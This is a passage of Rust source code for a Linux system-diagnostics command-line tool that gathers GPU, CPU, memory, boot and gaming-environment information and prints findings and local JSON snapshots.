    }
    false
}

fn detect_vulkan_loader_missing() -> bool {
    !is_command_available("vulkaninfo")
}

pub fn is_command_available(cmd: &str) -> bool {
    // Security: Validate command name to prevent injection attacks
    // Only allow alphanumeric characters, dash, and underscore (no paths/slashes)
    if !cmd
        .chars()
        .all(|c| c.is_alphanumeric() || c == '-' || c == '_')
    {
        return false;
    }

    // Use 'which' directly without shell for safety
    Command::new("which")
        .arg(cmd)
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status()
        .map(|s| s.success())
        .unwrap_or(false)
}

fn detect_gpu_info() -> Option<GpuDetails> {
    // Try NVIDIA proprietary tools first
    if let Some(info) = nvidia_gpu_info() {
        return Some(info);
    }

    // Try AMD ROCm tools (workstation/server setups)
    if let Some(info) = amd_gpu_info() {
        return Some(info);
    }

    // Try sysfs for Intel/AMD desktop (Mesa/RADV)
    // This reads /sys/class/drm/card*/device/hwmon for temp/power/fan
    if let Some(info) = sysfs_gpu_info() {
        return Some(info);
    }

    // Fallback to basic detection via glxinfo or lspci
    if let Some(info) = renderer_from_glxinfo() {
        return Some(info);
    }

    lspci_gpu_info()
}

fn nvidia_gpu_info() -> Option<GpuDetails> {
    let output = Command::new("nvidia-smi")
        .args([
            "--query-gpu=name,driver_version,temperature.gpu,utilization.gpu,memory.used,memory.total,fan.speed",
            "--format=csv,noheader,nounits",
        ])
        .env("LC_ALL", "C")  // Force C locale for consistent number format
        .env("LANG", "C")
        .output()
        .ok()?;
    if !output.status.success() {
        return None;
    }
    let text = String::from_utf8_lossy(&output.stdout).to_string();
    let line = text.lines().find(|line| !line.trim().is_empty())?;
    let parts: Vec<&str> = line.split(',').map(|item| item.trim()).collect();
    // Need at least 7 elements (indices 0-6) for all fields including fan_speed at index 6
    if parts.len() < 7 {
        return None;
    }
    let temperature = parts.get(2).and_then(|value| value.parse::<f32>().ok());
    let utilization = parts.get(3).and_then(|value| value.parse::<f32>().ok());
    let mem_used = parts.get(4).and_then(|value| value.parse::<f32>().ok());
    let mem_total = parts.get(5).and_then(|value| value.parse::<f32>().ok());
    let fan_speed = parts.get(6).and_then(|value| value.parse::<f32>().ok());
    Some(GpuDetails {
        vendor: "nvidia".into(),
        model: parts.get(0).map(|s| s.to_string()),
        driver: parts.get(1).map(|s| s.to_string()),
        temperature,
        utilization,
        memory_used_mb: mem_used,
        memory_total_mb: mem_total,
        fan_speed_percent: fan_speed,
    })
}

fn amd_gpu_info() -> Option<GpuDetails> {
    let output = Command::new("rocm-smi")
        .args([
            "--showtemp",
            "--showuse",
            "--showmeminfo",
            "vram",
            "--showfan",
        ])
        .env("LC_ALL", "C") // Force C locale for consistent number format
        .env("LANG", "C")
        .output()
        .ok()?;
    if !output.status.success() {
        return None;
    }
    let text = String::from_utf8_lossy(&output.stdout);

    let mut temperature = None;
    let mut utilization = None;
    let mut mem_used = None;
    let mut mem_total = None;
    let mut fan_speed = None;
    let mut model = None;

    for line in text.lines() {
        let lower = line.to_ascii_lowercase();
        if lower.contains("temperature") && temperature.is_none() {
            temperature = NUM_REGEX
                .find(&line)
                .and_then(|m| m.as_str().parse::<f32>().ok());
        } else if lower.contains("gpu use") && utilization.is_none() {
            utilization = NUM_REGEX
                .find(&line)
                .and_then(|m| m.as_str().parse::<f32>().ok());
        } else if lower.contains("vram used") {
            mem_used = NUM_REGEX
                .find(&line)
                .and_then(|m| m.as_str().parse::<f32>().ok());
        } else if lower.contains("vram total") {
            mem_total = NUM_REGEX
                .find(&line)
                .and_then(|m| m.as_str().parse::<f32>().ok());
        } else if lower.contains("fan speed") && lower.contains("%") {
            fan_speed = NUM_REGEX
                .find(&line)
                .and_then(|m| m.as_str().parse::<f32>().ok());
        } else if lower.contains("card series") || lower.contains("card model") {
            model = line.split(':').nth(1).map(|s| s.trim().to_string());
        }
    }

    if temperature.is_some() || utilization.is_some() {
        return Some(GpuDetails {
            vendor: "amd".into(),
            model,
            driver: None,
            temperature,
            utilization,
            memory_used_mb: mem_used,
            memory_total_mb: mem_total,
            fan_speed_percent: fan_speed,
        });
    }

    None
}

fn sysfs_gpu_info() -> Option<GpuDetails> {
    // Read GPU telemetry from sysfs (works for Intel/AMD on desktop Linux with Mesa)
    // Typical path: /sys/class/drm/card0/device/hwmon/hwmon*/temp1_input

    use std::path::Path;

    for card_num in 0..4 {
        let card_path = format!("/sys/class/drm/card{}/device", card_num);
        let card_dir = Path::new(&card_path);

        if !card_dir.exists() {
            continue;
        }

        // Detect vendor
        let vendor_path = format!("{}/vendor", card_path);
        let vendor_id = match fs::read_to_string(&vendor_path) {
            Ok(id) => id,
            Err(_) => continue, // Skip this card and try the next one
        };
        let vendor = match vendor_id.trim() {
            "0x8086" => "intel",
            "0x1002" => "amd",
            "0x10de" => "nvidia", // Should be caught by nvidia-smi, but just in case
            _ => continue,
        };

        // Read device name
        let device_path = format!("{}/device", card_path);
        let device_id = fs::read_to_string(&device_path).ok();

        // Try to find hwmon directory
        let hwmon_base = format!("{}/hwmon", card_path);
        let hwmon_dir = Path::new(&hwmon_base);

        if !hwmon_dir.exists() {
            continue;
        }

        let mut temperature = None;
        let mut fan_speed = None;

        // Find hwmon subdirectory (e.g., hwmon0, hwmon1)
        if let Ok(entries) = fs::read_dir(hwmon_dir) {
            for entry in entries.flatten() {
                let hwmon_path = entry.path();

                // Read temperature (usually temp1_input, in millidegrees)
                let temp_file = hwmon_path.join("temp1_input");
                if temp_file.exists() {
                    if let Ok(temp_str) = fs::read_to_string(&temp_file) {
                        if let Ok(temp_millidegrees) = temp_str.trim().parse::<f32>() {
                            temperature = Some(temp_millidegrees / 1000.0);
                        }
                    }
                }

                // Read fan speed (RPM)
                let fan_file = hwmon_path.join("fan1_input");
                if fan_file.exists() {
                    if let Ok(fan_str) = fs::read_to_string(&fan_file) {
                        if let Ok(fan_rpm) = fan_str.trim().parse::<f32>() {
                            // Convert RPM to percentage (rough estimate, max ~3000 RPM)
                            fan_speed = Some((fan_rpm / 30.0).min(100.0));
                        }
                    }
                }
            }
        }

        // Try to get GPU utilization (AMD specific path)
        let mut utilization = None;
        if vendor == "amd" {
            let gpu_busy_path = format!("{}/gpu_busy_percent", card_path);
            if let Ok(busy_str) = fs::read_to_string(&gpu_busy_path) {
                if let Ok(busy) = busy_str.trim().parse::<f32>() {
                    utilization = Some(busy);
                }
            }
        }

        // If we got any telemetry, return it
        if temperature.is_some() || fan_speed.is_some() || utilization.is_some() {
            return Some(GpuDetails {
                vendor: vendor.to_string(),
                model: device_id,
                driver: Some("mesa/kernel".to_string()),
                temperature,
                utilization,
                memory_total_mb: None, // Not available via sysfs
                memory_used_mb: None,
                fan_speed_percent: fan_speed,
            });
        }
    }

    None
}

fn renderer_from_glxinfo() -> Option<GpuDetails> {
    let output = Command::new("glxinfo").arg("-B").output().ok()?;
    if !output.status.success() {
        return None;
    }
    let text = String::from_utf8_lossy(&output.stdout);
    let mut vendor = None;
    let mut renderer = None;
    for line in text.lines() {
        if line.to_ascii_lowercase().contains("opengl vendor string") {
            vendor = line.split(':').nth(1).map(|s| s.trim().to_string());
        } else if line.to_ascii_lowercase().contains("opengl renderer string") {
            renderer = line.split(':').nth(1).map(|s| s.trim().to_string());
        }
    }
    if vendor.is_none() && renderer.is_none() {
        return None;
    }
    let label = vendor
        .clone()
        .or_else(|| renderer.clone())
        .unwrap_or_else(|| "other".into());
    Some(GpuDetails {
        vendor: normalize_vendor_label(&label),
        model: renderer,
        driver: None,
        temperature: None,
        utilization: None,
        memory_total_mb: None,
        memory_used_mb: None,
        fan_speed_percent: None,
    })
}

fn lspci_gpu_info() -> Option<GpuDetails> {
    let output = Command::new("sh")
        .arg("-c")
        .arg("lspci -nnk | grep -A2 -E '(VGA|3D)'")
        .output()
        .ok()?;
    if !output.status.success() {
        return None;
    }
    let text = String::from_utf8_lossy(&output.stdout).to_string();
    let line = text
        .lines()
        .find(|line| line.contains("VGA") || line.contains("3D"))?;
    Some(GpuDetails {
        vendor: normalize_vendor_label(line),
        model: Some(line.trim().to_string()),
        driver: None,
        ..Default::default()
    })
}

fn normalize_vendor_label(label: &str) -> String {
    let lower = label.to_ascii_lowercase();
    if lower.contains("nvidia") {
        "nvidia".into()
    } else if lower.contains("amd") || lower.contains("ati") || lower.contains("radeon") {
        "amd".into()
    } else if lower.contains("intel") {
        "intel".into()
    } else {
        "other".into()
    }
}

fn correlate_findings(findings: &mut Vec<Finding>) {
    let mut seen = HashSet::new();
    findings.retain(|finding| seen.insert(finding.rule_name.clone()));
    findings.sort_by(|a, b| b.severity_value.cmp(&a.severity_value));
}

fn log_to_history(findings: &[Finding]) -> Result<()> {
    if findings.is_empty() {
        return Ok(());
    }
    let cache_dir = user_home_dir()
        .map(|mut path| {
            path.push(HISTORY_DIR);
            path
        })
        .unwrap_or_else(|| PathBuf::from(HISTORY_DIR));
    fs::create_dir_all(&cache_dir).context("Unable to create cache directory")?;
    let mut db_path = cache_dir;
    db_path.push(HISTORY_FILE);

    let conn = Connection::open(db_path).context("Unable to open history database")?;
    conn.execute(
        "CREATE TABLE IF NOT EXISTS findings(
            ts TEXT NOT NULL,
            severity TEXT NOT NULL CHECK(length(severity) <= 100),
            message TEXT NOT NULL CHECK(length(message) <= 1000),
            solution TEXT NOT NULL CHECK(length(solution) <= 2000)
        )",
        [],
    )
    .context("Unable to create table")?;
    let timestamp: DateTime<Utc> = Utc::now();
    for finding in findings.iter().take(5) {
        conn.execute(
            "INSERT INTO findings(ts, severity, message, solution) VALUES (?1, ?2, ?3, ?4)",
            params![
                timestamp.to_rfc3339(),
                finding.severity,
                finding.message,
                finding.solution
            ],
        )
        .context("Unable to insert finding")?;
    }
    Ok(())
}

fn print_findings_table(findings: &[Finding]) {
    let severity_header = t!("severity_header").to_string();
    let diagnosis_header = t!("diagnosis_header").to_string();
    let solution_header = t!("solution_header").to_string();
    let line = "─".repeat(100);
    println!(
        "{:<12} │ {:<50} │ {}",
        severity_header, diagnosis_header, solution_header
    );
    println!("{line}");
    for finding in findings {
        println!(
            "{:<12} │ {:<50} │ {}",
            finding.severity,
            truncate(&finding.message, 50),
            finding.solution
        );
    }
}

#[derive(Clone, Copy)]
enum InsightLevel {
    Info,
    Good,
    Warning,
    Critical,
}

struct InsightLine {
    level: InsightLevel,
    message: String,
}

type SectionResult = std::result::Result<Vec<InsightLine>, String>;

fn stylize_insight(line: &InsightLine) -> colored::ColoredString {
    match line.level {
        InsightLevel::Info => line.message.clone().dimmed(),
        InsightLevel::Good => line.message.clone().green(),
        InsightLevel::Warning => line.message.clone().yellow(),
        InsightLevel::Critical => line.message.clone().red().bold(),
    }
}

fn print_section(title: &str, section: SectionResult) {
    println!("\n{}", title.bold());
    match section {
        Ok(lines) if !lines.is_empty() => {
            for line in lines {
                println!("  {}", stylize_insight(&line));
            }
        }
        Ok(_) => println!("  {}", t!("diag_section_no_entries").to_string().dimmed()),
        Err(message) => println!("  {}", message.dimmed()),
    }
}

fn truncate(text: &str, max: usize) -> String {
    let mut out = String::new();
    for (idx, ch) in text.chars().enumerate() {
        if idx >= max.saturating_sub(1) {
            out.push('…');
            return out;
        }
        out.push(ch);
    }
    out
}

fn filter_show(category: &str, findings: &[Finding]) {
    println!("{}", format!("== {category} ==").bold());
    if findings.is_empty() {
        println!("{}", t!("all_good").to_string().green());
        return;
    }
    print_findings_table(findings);
}

fn show_dashboard(findings: &[Finding], metrics: &Metrics) {
    println!("{}", t!("dashboard_header").to_string().bold().cyan());
    let uptime = Duration::from_secs(System::uptime());
    let net = read_total_network_received().unwrap_or(0);
    println!(
        "| System: {} | Uptime: {:?} | Net: {} bytes down | Disk: {:.1}% | CPU: {:.1}% | RAM: {:.1}% |",
        whoami::distro().bold(),
        uptime,
        net,
        metrics.disk_full_percent,
        metrics.cpu_usage,
        metrics.mem_usage
    );
    println!("{}", "╰──────────────────────╯\n".cyan());

    // Check for missing critical tools
    let missing = deps::check_missing_critical_tools();
    if !missing.is_empty() {
        println!("{}", t!("missing_tools_header").yellow().bold());
        for (tool, i18n_key) in missing {
            println!("   {} — {}", tool.yellow(), t!(i18n_key).dimmed());
        }
        println!(
            "   {}\n",
            t!("missing_tools_footer")
                .replace("{cmd}", "why check-deps")
                .cyan()
        );
    }

    if findings.is_empty() {
        println!("{}", t!("all_good").to_string().green().bold());
        return;
    }

    print_findings_table(findings);
    println!("\n{}", t!("dashboard_tip"));
}

fn show_crashes() -> Result<()> {
    let logs = recent_logs().ok_or_else(|| anyhow!("No logs available"))?;
    let errors: Vec<&str> = logs
        .lines()
        .filter(|line| {
            line.contains("panic") || line.contains("error") || line.contains("segfault")
        })
        .take(20)
        .collect();
    if errors.is_empty() {
        println!("{}", t!("no_recent_crashes").to_string().green());
    } else {
        println!("{}", t!("recent_crashes_header").to_string().bold());
        for line in errors {
            println!("• {}", line);
        }
    }
    Ok(())
}

fn show_historical() -> Result<()> {
    let mut path = user_home_dir().ok_or_else(|| anyhow!("Home not found"))?;
    path.push(HISTORY_DIR);
    path.push(HISTORY_FILE);
    if !path.exists() {
        println!("{}", t!("no_history").to_string().yellow());
        return Ok(());
    }
    let conn = Connection::open(path).context("Unable to open history database")?;
    let mut stmt = conn
        .prepare("SELECT ts, severity, message FROM findings ORDER BY ts DESC LIMIT 20")
        .context("Unable to read history")?;
    let mut rows = stmt.query([])?;
    println!("{}", t!("history_header").to_string().bold());
    while let Some(row) = rows.next()? {
        let ts: String = row.get(0)?;
        let severity: String = row.get(1)?;
        let message: String = row.get(2)?;
        println!("[{ts}] {severity} — {message}");
    }
    Ok(())
}

fn generate_snapshot(metrics: &Metrics, findings: &[Finding]) -> Result<()> {
    use chrono::Utc;
    use std::process::Command;

    // Gather system metadata
    let timestamp = Utc::now().to_rfc3339();
    let hostname = whoami::devicename();
    let kernel = run_cmd_c_locale("uname", &["-r"]).unwrap_or_else(|| "unknown".to_string());
    let distro = whoami::distro().to_string();
    let uptime_seconds = System::uptime();

    // Gather recent logs (last 100 lines)
    let recent_dmesg = Command::new("dmesg").output().ok().and_then(|out| {
        if out.status.success() {
            Some(
                String::from_utf8_lossy(&out.stdout)
                    .lines()
                    .rev()
                    .take(100)
                    .map(|s| s.to_string())
                    .collect::<Vec<_>>(),
            )
        } else {
            None
        }
    });

    let recent_journal = Command::new("journalctl")
        .args(["-n", "100", "--no-pager"])
        .output()
        .ok()
        .and_then(|out| {
            if out.status.success() {
                Some(
                    String::from_utf8_lossy(&out.stdout)
                        .lines()
                        .map(|s| s.to_string())
                        .collect::<Vec<_>>(),
                )
            } else {
                None
            }
        });

    // Track what's included for summary
    let has_dmesg = recent_dmesg.is_some();
    let has_journal = recent_journal.is_some();

    // Build snapshot
    let snapshot = SnapshotData {
        timestamp: timestamp.clone(),
        hostname: hostname.clone(),
        kernel,
        distro,
        uptime_seconds,
        metrics: Metrics {
            cpu_usage: metrics.cpu_usage,
            mem_usage: metrics.mem_usage,
            total_ram_mb: metrics.total_ram_mb,
            disk_full_percent: metrics.disk_full_percent,
            filesystem: metrics.filesystem.clone(),
            snap_loops: metrics.snap_loops,
            flatpak_unused: metrics.flatpak_unused,
            battery_drain_w: metrics.battery_drain_w,
            wifi_channel_count: metrics.wifi_channel_count,
            wifi_signal_dbm: metrics.wifi_signal_dbm,
            fan_speed_rpm: metrics.fan_speed_rpm,
            temperature_c: metrics.temperature_c,
            wayland_vs_x11: metrics.wayland_vs_x11.clone(),
            docker_dangling: metrics.docker_dangling,
            process_names: metrics.process_names.clone(),
            process_count: metrics.process_count,
            pipewire_latency_ms: metrics.pipewire_latency_ms,
            firefox_soft_render: metrics.firefox_soft_render,
            zfs_arc_full_percent: metrics.zfs_arc_full_percent,
            luks_device_count: metrics.luks_device_count,
            gpu: metrics.gpu.clone(),
            prime_offload_enabled: metrics.prime_offload_enabled,
            gamescope_running: metrics.gamescope_running,
            steam_running: metrics.steam_running,
            proton_failure_detected: metrics.proton_failure_detected,
            vulkan_loader_missing: metrics.vulkan_loader_missing,
        },
        findings: findings.to_vec(),
        recent_dmesg,
        recent_journal,
    };

    // Generate JSON
    let json = serde_json::to_string_pretty(&snapshot).context("Failed to serialize snapshot")?;

    let filename = format!("why-snapshot-{}.json", timestamp.replace(':', "-"));
    fs::write(&filename, &json).with_context(|| format!("Failed to write {}", filename))?;

    println!("{}", t!("snapshot_generated").green().bold());
    println!();
    println!("{}  {}", t!("snapshot_json_label").bold(), filename.cyan());
    println!(
        "{}     {}",
        t!("snapshot_size_label").dimmed(),
        format!("{} bytes", json.len()).dimmed()
    );
    println!();
    println!("{}", t!("snapshot_includes").bold());
    println!("  • {}", t!("snapshot_metadata"));
    println!("  • {}", t!("snapshot_metrics"));
    println!(
        "  • {}",
        t!("snapshot_findings_count").replace("{count}", &findings.len().to_string())
    );
    if has_dmesg {
        println!("  • {}", t!("snapshot_dmesg"));
    }
    if has_journal {
        println!("  • {}", t!("snapshot_journal"));
    }
    println!();
    println!("{}", t!("snapshot_attach_tip").dimmed());

    Ok(())
}

fn why_slow(sys: &System, metrics: &Metrics, findings: &[Finding]) -> Result<()> {
    println!("{}", t!("slow_header").to_string().bold());
    println!();

    // System vitals
    println!(
        "{}",
        t!("slow_system_performance").to_string().bold().cyan()
    );
    println!("{} {:.1}%", t!("slow_cpu_label"), metrics.cpu_usage);
    if metrics.cpu_usage > 80.0 {
        println!("  {} {}", "⚠️".yellow(), t!("slow_cpu_very_high"));
    } else if metrics.cpu_usage > 60.0 {
        println!("  {} {}", "⚠️".yellow(), t!("slow_cpu_elevated"));
    } else {
        println!("  {} {}", "✓".green(), t!("slow_cpu_normal"));
    }

    println!(
        "{} {:.1}% ({} MB total)",
        t!("slow_ram_label"),
        metrics.mem_usage,
        metrics.total_ram_mb
    );
    if metrics.mem_usage > 90.0 {
        println!("  {} {}", "🔥".red(), t!("slow_ram_critical"));
    } else if metrics.mem_usage > 75.0 {
        println!("  {} {}", "⚠️".yellow(), t!("slow_ram_high"));
    } else {
        println!("  {} {}", "✓".green(), t!("slow_ram_acceptable"));
    }

    println!(
        "{} {:.1}% full",
        t!("slow_disk_label"),
        metrics.disk_full_percent
    );
    if metrics.disk_full_percent > 90.0 {
        println!("  {} {}", "🔥".red(), t!("slow_disk_critical"));
    } else if metrics.disk_full_percent > 80.0 {
        println!("  {} {}", "⚠️".yellow(), t!("slow_disk_high"));
    } else {
        println!("  {} {}", "✓".green(), t!("slow_disk_fine"));
    }

    println!();

    // Top CPU consumers
    println!("{}", t!("slow_top_cpu").to_string().bold().cyan());
    let mut cpu_procs: Vec<_> = sys
        .processes()
        .values()
        .map(|p| (p.cpu_usage(), p.name().to_string()))
        .collect();
    cpu_procs.sort_by(|a, b| b.0.partial_cmp(&a.0).unwrap_or(std::cmp::Ordering::Equal));
    for (usage, name) in cpu_procs.iter().take(5) {
        if *usage > 5.0 {
            println!("  {:<30} {:.1}%", name, usage);
        }
    }

    println!();

    // Top RAM consumers
    println!("{}", t!("slow_top_ram").to_string().bold().cyan());
    let mut mem_procs: Vec<_> = sys
        .processes()
        .values()
        .map(|p| (p.memory(), p.name().to_string()))
        .collect();
    mem_procs.sort_by(|a, b| b.0.cmp(&a.0));
    for (mem_kb, name) in mem_procs.iter().take(5) {
        let mem_mb = *mem_kb / 1024;
        if mem_mb > 100 {
            println!("  {:<30} {} MB", name, mem_mb);
        }
    }

    println!();

    // Performance-related findings
    let perf_findings: Vec<&Finding> = findings
        .iter()
        .filter(|f| {
            f.rule_name.contains("cpu")
                || f.rule_name.contains("mem")
                || f.rule_name.contains("disk")
                || f.rule_name.contains("snap")
                || f.rule_name.contains("flatpak")
                || f.rule_name.contains("baloo")
                || f.rule_name.contains("chrome")
                || f.rule_name.contains("firefox")
                || f.rule_name.contains("docker")
                || f.rule_name.contains("swap")
                || f.rule_name.contains("zram")
        })
        .collect();

    if !perf_findings.is_empty() {
        println!("{}", t!("slow_issues_detected").to_string().bold().red());
        for finding in perf_findings.iter().take(8) {
            println!(
                "{} {} — {}",
                finding.severity,
                finding.message.trim(),
                finding.solution
            );
        }
    } else {
        println!("{}", t!("slow_all_good").to_string().green().bold());
    }

    println!();
    println!("{}", t!("slow_tip"));

    Ok(())
}

fn why_wifi() -> Result<()> {
    println!("{}", t!("wifi_header").to_string().bold());
    if let Some(networks) = wifi_networks() {
        println!("{} {}", t!("wifi_networks_detected"), networks.len());
        for net in networks.iter().take(10) {
            let state = if net.active {
                t!("wifi_active_label").to_string().green()
            } else {
                t!("wifi_seen_label").to_string().yellow()
            };
            println!(
                "{} | {} | {} dBm",
                state,
                net.channel
                    .map(|c| format!("ch {c}"))
                    .unwrap_or_else(|| t!("wifi_unknown_channel").into()),
                net.signal
                    .map(|s| format!("{s:.0}"))
                    .unwrap_or_else(|| "?".into())
            );
        }
    } else {
        println!("{}", t!("wifi_nmcli_missing").to_string().yellow());
    }
    Ok(())
}

fn why_bluetooth() -> Result<()> {
    println!("{}", t!("bluetooth_header").to_string().bold());
    let output = Command::new("bluetoothctl").arg("show").output();
    match output {
        Ok(data) if data.status.success() => {
            let info = String::from_utf8_lossy(&data.stdout);
            for line in info.lines() {
                println!("{line}");
            }
        }
        _ => println!("{}", t!("bluetooth_missing").to_string().yellow()),
    }
    Ok(())
}

fn why_fan(sys: &System, metrics: &Metrics) -> Result<()> {
    println!("{}", t!("fan_header").to_string().bold());
    if let Some(speed) = metrics.fan_speed_rpm {
        println!("{} {:.0} RPM", t!("fan_speed_label"), speed);
    } else {
        println!("{}", t!("fan_speed_unknown"));
    }
    let mut processes: Vec<_> = sys
        .processes()
        .values()
        .map(|proc| (proc.cpu_usage(), proc.name().to_string()))
        .collect();
    processes.sort_by(|a, b| b.0.partial_cmp(&a.0).unwrap_or(Ordering::Equal));
    for (usage, name) in processes.into_iter().take(5) {
        println!("• {name}: {usage:.1}% CPU");
    }
    Ok(())
}

fn why_hot(metrics: &Metrics) -> Result<()> {
    println!("{}", t!("hot_header").to_string().bold());
    if let Some(temp) = metrics.temperature_c {
        println!("{} {:.1}°C", t!("hot_max_temp"), temp);
    } else {
        println!("{}", t!("hot_temp_unknown"));
    }
    Ok(())
}

fn why_update() -> Result<()> {
    println!("{}", t!("update_header").to_string().bold());
    if let Some(count) = check_updates() {
        println!(
            "{}",
            t!("update_pending").replace("{count}", &count.to_string())
        );
    } else {
        println!("{}", t!("update_unknown"));
    }
    Ok(())
}

fn check_updates() -> Option<u32> {
    let patterns = [
        ("apt", vec!["-s", "upgrade"]),
        ("dnf", vec!["check-update"]),
        ("pacman", vec!["-Qu"]),
    ];
    for (cmd, args) in patterns {
        let output = match Command::new(cmd).args(&args).output() {
            Ok(output) => output,
            Err(_) => continue,
        };
        if !output.status.success() {
            continue;
        }
        let count = String::from_utf8_lossy(&output.stdout)
            .lines()
            .filter(|line| !line.trim().is_empty() && !line.starts_with("Listing"))
            .count();
        if count > 0 {
            return Some(count as u32);
        }
    }
    None
}

fn why_boot() -> Result<()> {
    println!("{}", t!("boot_header").to_string().bold());
    let output = Command::new("systemd-analyze").arg("blame").output().ok();
    if let Some(data) = output {
        if data.status.success() {
            for line in String::from_utf8_lossy(&data.stdout).lines().take(10) {
                println!("{line}");
            }
            return Ok(());
        }
    }
    println!("{}", t!("boot_unknown"));
    Ok(())
}

fn why_boot_critical() -> Result<()> {
    println!("{}", t!("boot_critical_header").to_string().bold());
    if !is_command_available("systemd-analyze") {
        println!("{}", t!("boot_unknown"));
        return Ok(());
    }

    let blame_entries = collect_systemd_blame().unwrap_or_default();
    let mut flagged = false;
    let blame_header = t!("boot_critical_blame_header").to_string();
    let blame_lines: Vec<InsightLine> = blame_entries
        .iter()
        .take(10)
        .map(|entry| {
            let level = if entry.seconds >= BOOT_SLOW_SERVICE_CRITICAL {
                InsightLevel::Critical
            } else if entry.seconds >= BOOT_SLOW_SERVICE_WARNING {
                InsightLevel::Warning
            } else {
                InsightLevel::Info
            };
            if matches!(level, InsightLevel::Warning | InsightLevel::Critical) {
                flagged = true;
            }
            InsightLine {
                level,
                message: format!("{:>8} {}", format!("{:.2}s", entry.seconds), entry.unit),
            }
        })
        .collect();
    print_section(&blame_header, Ok(blame_lines));
    if !flagged {
        let ok = t!("boot_critical_no_slow_services")
            .replace("{threshold}", &format!("{:.1}", BOOT_SLOW_SERVICE_WARNING));
        println!("  {}", ok.green());
    }

    let chain_header = t!("boot_critical_chain_header").to_string();
    println!("\n{}", chain_header.bold());
    let chain_output = Command::new("systemd-analyze")
        .args(["critical-chain", "--no-pager"])
        .output();
    match chain_output {
        Ok(out) if out.status.success() => {
            for line in String::from_utf8_lossy(&out.stdout).lines().take(20) {
                println!("{line}");
            }
        }
        _ => println!(
            "  {}",
            t!("boot_critical_chain_missing").to_string().yellow()
        ),
    }

    Ok(())
}

#[derive(Debug)]
struct BootService {
    unit: String,
    seconds: f32,
}

fn collect_systemd_blame() -> Option<Vec<BootService>> {
    let output = Command::new("systemd-analyze")
        .args(["blame", "--no-pager"])
        .output()
        .ok()?;
    if !output.status.success() {
        return None;
    }
    let mut entries = Vec::new();
    let text = String::from_utf8_lossy(&output.stdout);
    for line in text.lines() {
        let trimmed = line.trim();
        if trimmed.is_empty() {
            continue;
        }
        let tokens: Vec<&str> = trimmed.split_whitespace().collect();
        if tokens.len() < 2 {
            continue;
        }
        let mut seconds = 0.0;
        let mut consumed = 0;
        for token in &tokens {
            if let Some(value) = parse_systemd_duration_token(token) {
                seconds += value;
                consumed += 1;
            } else {
                break;
            }
        }
        if consumed == 0 || consumed >= tokens.len() {
            continue;
        }
        let unit = tokens[consumed..].join(" ");
        entries.push(BootService { unit, seconds });
    }
    entries.sort_by(|a, b| b.seconds.partial_cmp(&a.seconds).unwrap_or(Ordering::Equal));
    Some(entries)
}

fn parse_systemd_duration_token(token: &str) -> Option<f32> {
    if let Some(value) = token.strip_suffix("ms") {
        return value.trim().parse::<f32>().ok().map(|ms| ms / 1_000.0);
    }
    if let Some(value) = token.strip_suffix("us") {
        return value.trim().parse::<f32>().ok().map(|us| us / 1_000_000.0);
    }
    if let Some(value) = token.strip_suffix("s") {
        return value.trim().parse::<f32>().ok();
    }
    if let Some(value) = token.strip_suffix("min") {
        return value.trim().parse::<f32>().ok().map(|min| min * 60.0);
    }
    None
}

fn why_gpu(metrics: &Metrics) -> Result<()> {
    println!("{}", t!("gpu_header").to_string().bold());
    if let Some(gpu) = metrics.gpu.as_ref() {
        println!("{} {}", t!("gpu_vendor_label"), gpu.vendor.to_uppercase());
        if let Some(model) = &gpu.model {
            println!("{} {}", t!("gpu_model_label"), model);
        }
        if let Some(driver) = &gpu.driver {
            println!("{} {}", t!("gpu_driver_label"), driver);
        }
        if let Some(temp) = gpu.temperature {
            println!("{} {:.1}°C", t!("gpu_temp_label"), temp);
            if temp > 85.0 {
                println!("{}", t!("gpu_temp_warning").to_string().red());
            } else if temp > 75.0 {
                println!("{}", t!("gpu_temp_high").to_string().yellow());
            }
        }
        if let Some(util) = gpu.utilization {
            println!("{} {:.0}%", t!("gpu_util_label"), util);
            if util > 95.0 {
                println!("{}", t!("gpu_util_warning").to_string().yellow());
            }
        }
        if let Some(mem_util) = gpu.memory_utilization() {
            println!("{} {:.0}%", t!("gpu_mem_label"), mem_util);
            if mem_util > 90.0 {
                println!("{}", t!("gpu_mem_warning").to_string().yellow());
            }
        }
        if let Some(fan) = gpu.fan_speed_percent {
            println!("{} {:.0}%", t!("gpu_fan_label"), fan);
            if fan > 85.0 {
                println!("{}", t!("gpu_fan_warning").to_string().yellow());
            }
        }

        // Vendor-specific tips
        match gpu.vendor.as_str() {
            "nvidia" => {
                if !metrics.prime_offload_enabled {
                    println!("{}", t!("gpu_prime_missing").to_string().yellow());
                } else {
                    println!("{}", t!("gpu_prime_ok").to_string().green());
                }
                println!("{}", t!("gpu_nvidia_tip"));
            }
            "amd" => {
                println!("{}", t!("gpu_amd_tip"));
                // Check for AMDVLK vs RADV
                if let Ok(output) = Command::new("vulkaninfo").arg("--summary").output() {
                    if output.status.success() {
                        let text = String::from_utf8_lossy(&output.stdout);
                        if text.contains("AMDVLK") {
                            println!("{}", t!("gpu_amd_amdvlk").to_string().yellow());
                        } else if text.contains("RADV") {
                            println!("{}", t!("gpu_amd_radv").to_string().green());
                        }
                    }
                }
            }
            "intel" => {
                println!("{}", t!("gpu_intel_tip"));
            }
            _ => {}
        }
    } else {
        println!("{}", t!("gpu_no_data").to_string().yellow());
        println!("{}", t!("gpu_install_tools"));
    }
    if metrics.vulkan_loader_missing {
        println!("{}", t!("gpu_vulkan_missing").to_string().yellow());
    } else {
        println!("{}", t!("gpu_vulkan_ok").to_string().green());
    }
    Ok(())
}

fn why_gaming(metrics: &Metrics) -> Result<()> {
    println!("{}", t!("gaming_header").to_string().bold());
    println!();

    // General gaming environment checks (always run, regardless of Steam)

    // GameMode detection
    if is_command_available("gamemoderun") {
        println!("{}", t!("gaming_gamemode_installed").to_string().green());
    } else {
        println!("{}", t!("gaming_gamemode_missing").to_string().yellow());
    }

    // MangoHud detection
    if is_command_available("mangohud") {
        println!("{}", t!("gaming_mangohud_installed").to_string().green());
    } else {
        println!("{}", t!("gaming_mangohud_missing").to_string().yellow());
    }

    // Vulkan
    if metrics.vulkan_loader_missing {
        println!("{}", t!("gaming_vulkan_missing").to_string().yellow());
    } else {
        println!("{}", t!("gaming_vulkan_ok").to_string().green());
    }

    // Gamescope
    if metrics.gamescope_running {
        println!("{}", t!("gaming_gamescope_running").to_string().green());
    } else {
        println!("{}", t!("gaming_gamescope_missing").to_string().yellow());
    }

    println!();

    // GPU-specific gaming checks and warnings
    if let Some(gpu) = metrics.gpu.as_ref() {
        match gpu.vendor.as_str() {
            "nvidia" => {
                if !metrics.prime_offload_enabled {
